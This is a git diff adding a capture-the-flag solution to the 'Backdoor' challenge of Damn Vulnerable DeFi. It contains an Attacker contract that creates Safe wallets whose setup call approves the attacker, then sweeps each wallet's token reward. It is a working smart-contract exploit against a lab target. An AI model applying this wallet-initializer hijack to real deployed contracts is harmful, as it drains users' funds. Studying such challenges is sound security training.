@@ -4,7 +4,9 @@ pragma solidity =0.8.25;
 
 import {Test, console} from "forge-std/Test.sol";
 import {Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";
-import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
+import {SafeProxyFactory, IProxyCreationCallback} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
+import {IProxyCreationCallback} from "@safe-global/safe-smart-account/contracts/proxies/IProxyCreationCallback.sol";
+import { SafeProxy} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxy.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {WalletRegistry} from "../../src/backdoor/WalletRegistry.sol";
 
@@ -69,8 +71,32 @@ contract BackdoorChallenge is Test {
     /**
      * CODE YOUR SOLUTION HERE
      */
-    function test_backdoor() public checkSolvedByPlayer {
-        
+    /*
+    1. Create a new wallet 
+    2. Use the setUp modules on setup function to call approve on token to then take them 
+
+    1. Create a new wallet 
+    2. Use the setUp modules on setup function to setup a module that allows me to use token funds, and then modify to owner of proxy (me out beneficiary in)
+    
+    1. Create a new wallet 
+    2. Use the setupModules on setup function to call a multicall contract that delegate calls to WalletRegistry with "this" as proxy address and returning a beneficiary when request for them
+    I was wrong, I dont neet to call the setup modules, just pass the call to the  registry callback as initializer 
+    
+    1. prev proxy address -> Now I can use the initializer cause I dont need proxy address to create it, so I can call the proxy -> needs to add the wallet registry as owner 
+     */
+    function test_backdoor() public 
+    checkSolvedByPlayer 
+    {
+        Attacker attacker = new Attacker();
+
+        attacker.attack(
+            users,
+            token,
+            walletFactory,
+            singletonCopy,
+            walletRegistry,
+            recovery
+        );
     }
 
     /**
@@ -92,5 +118,52 @@ contract BackdoorChallenge is Test {
 
         // Recovery account must own all tokens
         assertEq(token.balanceOf(recovery), AMOUNT_TOKENS_DISTRIBUTED);
+    }
+}
+
+
+contract Attacker {
+    function approve(DamnValuableToken token, address receiver, uint256 amount) public {
+        token.approve(receiver, amount);
+    }
+    
+    function attack(
+        address[] memory users,
+        DamnValuableToken token,
+        SafeProxyFactory walletFactory,
+        Safe singletonCopy,
+        WalletRegistry walletRegistry,
+        address recovery
+    ) public {
+        // loop for each user
+        for(uint8 i; i<users.length; i++) {
+            // prepare setup params
+            address[] memory _owners = new address[](1);
+            _owners[0] = users[i];
+
+            bytes memory initializer = abi.encodeWithSignature(
+                'setup(address[],uint256,address,bytes,address,address,uint256,address)',
+                _owners, 
+                1, 
+                // THE ATTACK IS HERE (next 2 lines)
+                address(this), // call this contract
+                abi.encodeWithSignature('approve(address,address,uint256)', token, address(this), 10e18), // ATTACK -> call to approve tokens on behalf the Safe
+                address(0), 
+                address(0),
+                0,
+                address(0) 
+            );
+
+            // create the wallet
+            SafeProxy proxy = walletFactory.createProxyWithCallback(
+                address(singletonCopy),
+                initializer,
+                0,
+                walletRegistry
+            );
+            // Aboves function finish when the callback to Registry is executed AKA the new wallet already has the reward
+            // So we just have to call transferFrom to recover the funds
+            token.transferFrom(address(proxy), recovery, 10e18);
+        }
     }
 }
